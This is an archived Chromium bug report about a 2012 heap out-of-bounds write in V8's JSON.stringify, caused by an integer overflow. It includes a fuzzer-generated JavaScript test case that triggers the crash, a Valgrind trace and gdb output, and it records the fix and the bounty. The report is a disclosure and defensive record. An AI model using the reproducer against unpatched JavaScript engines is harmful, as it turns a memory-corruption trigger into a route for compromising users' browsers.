# [LangFuzz] Crash at v8::internal::BasicJsonStringifier::SerializeString

| Field | Value |
|-------|-------|
| **Issue ID** | [40076557](https://issues.chromium.org/issues/40076557) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | de...@googlemail.com |
| **Assignee** | ya...@chromium.org |
| **Created** | 2012-11-08 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/18.0 Firefox/18.0

Steps to reproduce the problem:
Load the following test case in the browser or d8 shell:

function PrettyPrint(value) {
  return JSON.stringify(value);
}
function fail(expectedText, found, name_opt) {
  "> found <" + PrettyPrint(found) + ">";
}
var a = '';
while (a.length < (2 << 11)) { a+= 'x'; }
a.replace(/^(.*)/, '$1$1$1');
function TestBreak() {
  var sequence = "";
  for (var foo = 0; foo < 70000; foo++)
    sequence += a;
  return sequence;
}
fail(PrettyPrint("01"), TestBreak())

What is the expected behavior?

What went wrong?
Browser crashes (sad tab) but I wasn't able to get a crash in GDB (ASan might be able to point. The d8 shell shows this crash which is likely more helpful:

==27978== Invalid write of size 1
==27978==    at 0x5DDE25: void v8::internal::BasicJsonStringifier::SerializeString_<true, char>(v8::internal::Vector<char const>, v8::internal::Handle<v8::internal::String>) (in /scratch/holler/LangFuzz/v8-trunk/out/x64.release/d8)
==27978==    by 0x5DEC23: v8::internal::BasicJsonStringifier::SerializeString(v8::internal::Handle<v8::internal::String>) (in /scratch/holler/LangFuzz/v8-trunk/out/x64.release/d8)
==27978==    by 0x5DFDD0: v8::internal::BasicJsonStringifier::Result v8::internal::BasicJsonStringifier::Serialize_<false>(v8::internal::Handle<v8::internal::Object>, bool, v8::internal::Handle<v8::internal::String>) (in /scratch/holler/LangFuzz/v8-trunk/out/x64.release/d8)
==27978==    by 0x5E086E: v8::internal::BasicJsonStringifier::Stringify(v8::internal::Handle<v8::internal::Object>) (in /scratch/holler/LangFuzz/v8-trunk/out/x64.release/d8)
==27978==    by 0x5E0AC7: v8::internal::Runtime_BasicJSONStringify(v8::internal::Arguments, v8::internal::Isolate*) (in /scratch/holler/LangFuzz/v8-trunk/out/x64.release/d8)
==27978==    by 0x2C779CE0618D: ???
==27978==    by 0x2C779CE30C9A: ???
==27978==    by 0x2C779CE0A96D: ???
==27978==    by 0x2C779CE30A56: ???
==27978==    by 0x2C779CE31BD1: ???
==27978==    by 0x2C779CE0A96D: ???
==27978==    by 0x2C779CE2F253: ???
==27978==  Address 0x7b786000000 is not stack'd, malloc'd or (recently) free'd

Did this work before? N/A 

Chrome version: 24.0.1312.5 dev  Channel: dev
OS Version: 12.04

(The new report system could use some improvements for reporting security bugs like this (e.g. there is no field for the test case or crash trace.)

## Timeline

### in...@chromium.org (2012-11-09)

[Empty comment from Monorail migration]

### pa...@chromium.org (2012-11-09)

I can only reproduce it in canary/dev/ToT on Linux and Windows (my Windows canary is 25.0.1321.0). 24.0.1312.5 beta on Linux, and 23 on Windows, do not crash for me.

### sc...@gmail.com (2012-11-09)

[Empty comment from Monorail migration]

### ts...@chromium.org (2012-11-10)

Looks to be an integer overflow in json-stringifier.h:718

718    if (current_index_ + (length << 3) + kEnclosingQuotesLength < part_length_) 

(gdb) p length
$24 = 286720000
(gdb) p length << 3
$25 = -2001207296




### ve...@chromium.org (2012-11-11)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-11-11)

[Empty comment from Monorail migration]

### ya...@chromium.org (2012-11-12)

Fixed on r12925. Version 3.14 (Chromium 24) is not affected.

### ya...@chromium.org (2012-11-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-11-12)

tagging based on c#7.

### in...@chromium.org (2012-11-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-12-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-12-04)

Nice regression catch @decoder, $1000

### sc...@gmail.com (2012-12-14)

Payment in system.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/160010?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076557)*
